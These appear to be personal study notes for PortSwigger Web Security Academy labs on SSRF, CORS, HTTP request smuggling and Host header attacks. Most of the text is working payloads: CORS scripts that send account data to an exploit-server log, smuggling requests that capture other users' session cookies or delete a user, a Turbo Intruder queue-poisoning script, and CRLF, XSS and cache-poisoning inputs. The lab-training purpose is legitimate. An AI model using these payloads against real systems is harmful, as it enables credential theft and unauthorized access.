## SSRF Vulnerabilities:
- ==Blind SSRF with out-of-band detection== - from a product page, Referer: https://burp_id.oastify.com

## CORS Vulnerabilities:
- ==CORS vulnerability with trusted null origin== 
  try different endpoints adding Origin: null, and look for response to contain ACAO: null
  \<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	  var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
	};
	</script>"></iframe>
- ==CORS vulnerability with basic origin reflection== 
  <script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
        location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
};
</script>


## HTTP Request Smuggling Vulnerabilities
- ==Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability==
  ![[Pasted image 20260404231417.png]]Try HTTP Request Smuggler Burp Extension -> Smuggle Probe.  This may take five minutes or more. In Extensions -> HTTP Request Smuggler -> Output:
  ![[Pasted image 20260404231503.png|673]]
  ![[Pasted image 20260404231539.png]]
  
  View in All issues. Extensions -> HTTP Request Smuggler -> Smuggle attack (CL.TE) 
  ![[Pasted image 20260404231702.png]]
  Adjust accordingly:
  ![[Pasted image 20260404231825.png]]
  GET /admin/delete?username=carlos HTTP/1.1
  Host:localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10
  
  abc
  Then view the results in Turbo Intruder window
- ==Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability==
  Same steps as above to identify, then to exploit, use TE.CL smuggling attack.
  ![[Pasted image 20260404234703.png]]
  ![[Pasted image 20260404234732.png|523]]
  prefix = '''GET /admin HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 16
  
  X=smug
  '''
  Request 1 and Response 1:
  ![[Pasted image 20260404234821.png]]
  
  Request 2 and Response 2:
  ![[Pasted image 20260404234826.png]]
  

- ==Exploiting HTTP request smuggling to capture other users' requests== 
  ![[Pasted image 20260405180553.png]]
  Make sure to switch out the cookie and csrf 
  
  POST /post/comment HTTP/1.1
  Host: lab_id.web-security-academy.net
  Cookie: session=Erp3BGDxVYlY00HQnKlRurl6tk9aP0be
  Content-Length: 950
  Content-Type: application/x-www-form-urlencoded
  
  csrf=qtXgxVhUp7fwVV7Uz5PyI1YJ3aUDOrAE&postId=3&name=Test&email=t%40er.net&website=https%3A%2F%2Ftest.com&comment=
  
  Full request would look like:
  
  POST / HTTP/1.1
  Host: lab_id.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 334
  Transfer-Encoding: chunked
  
  0
  
  POST /post/comment HTTP/1.1
  Host: lab_id.web-security-academy.net
  Cookie: session=Erp3BGDxVYlY00HQnKlRurl6tk9aP0be
  Content-Length: 950
  Content-Type: application/x-www-form-urlencoded
  
  csrf=qtXgxVhUp7fwVV7Uz5PyI1YJ3aUDOrAE&postId=1&name=Test&email=t%40er.net&website=https%3A%2F%2Ftest.com&comment=
  
  View the post (check the post ID) for the session cookie, then use to access user's account


- ==Exploiting HTTP request smuggling to deliver reflected XSS== 
  Payload: GET /post?postId=5 HTTP/1.1
  User-Agent: a"/>\<script>alert(1)\</script>
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10
  
  X=smug
- ==Response queue poisoning via H2.TE request smuggling== 
  GET /foodbar HTTP/1.1
  Host: lab_id.web-security-academy.net
  
  
  Do not forget the two extra lines after the Host header (/r/n/r/n)
  E.g.:
  > [!note]
  > def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           maxRetriesPerRequest=0
                           )
    engine.start()

    \# This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /foodbar HTTP/1.1
    Host: 0aa1007b048317ea805c1231009e00e5.web-security-academy.net
    
    
    '''

    \# HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')

\    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    victim = target.req

 \   while True:

  \      engine.queue(attack)
        for i in range(1):
            engine.queue(victim)
            time.sleep(0.05)
        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)


- ==H2.CL request smuggling== 
  Change the file to /resources/js and the body to alert(document.cookie) then send the following payload in Intruder with Concurrent resquests set to 1 and delay set to 10000 and don't update content-length
  And Header to Content-Type: text/javascript
  
  POST / HTTP/2
  Host: lab_id.web-security-academy.net
  Content-Length: 0
  
   GET /resources/js HTTP/1.1
   Host: exploit_id.exploit-server.net
   Content-Length: 5
   
   x

- ==CL.0 request smuggling== 
  POST /resources/images/blog.svg HTTP/1.1
  Host: lab_id.web-security-academy.net
  Cookie: session=QHeRNaIVFuLquZeXFTOndMKN5AAdSu63
  Connection: keep-alive
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 53
  
  GET /admin/delete?username=carlos HTTP/1.1
  Food: bar

- ==HTTP request smuggling, obfuscating the TE header== 
  Can use HTTP Request Smuggler as above
- ==HTTP/2 request splitting via CRLF injection== 
  Add a new header to HTTP2 request
  
  Name
  
  food
  Value
  
  bar\r\n
  \r\n
  GET /x HTTP/1.1\r\n
  Host: lab_id.web-security-academy.net
  
  Send until 302 and steal the cookie

## HTTP Host Header Vulnerabilities:
- ==Web cache poisoning via ambiguous requests== 
  Change file name to /resources/js/tracking.js
  and body to alert(document.cookie)
   
   Poison the / root page with:
   
   Host: lab_id.h1-web-security-academy.net
   Host: exploit_id.exploit-server.net
- ==Routing-based SSRF==
  Run Intruder with Host: 192.168.0.[payload] and make sure Update Host header to match target is deselected.
  Use discovered IP address to act as admin
- ==SSRF via flawed request parsing==
  The server accepts absolute URLs in request line.
  Use GET https://lab_id.web-security-academy.net/admin
  With Intruder with Host: 192.168.0.[payload] and make sure Update Host header to match target is deselected.
  Then use this to access the admin panel
  
  Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos. The request line should now look like this but with a different CSRF token:
  
  GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
- ==Host validation bypass via connection state attack==
  Send two GET / requests to the Repeater and group them together.
  Modify the second request to GET /admin with Host: 192.168.0.1
  And send group in single connection
  POST /admin/delete with csrf and username parameters

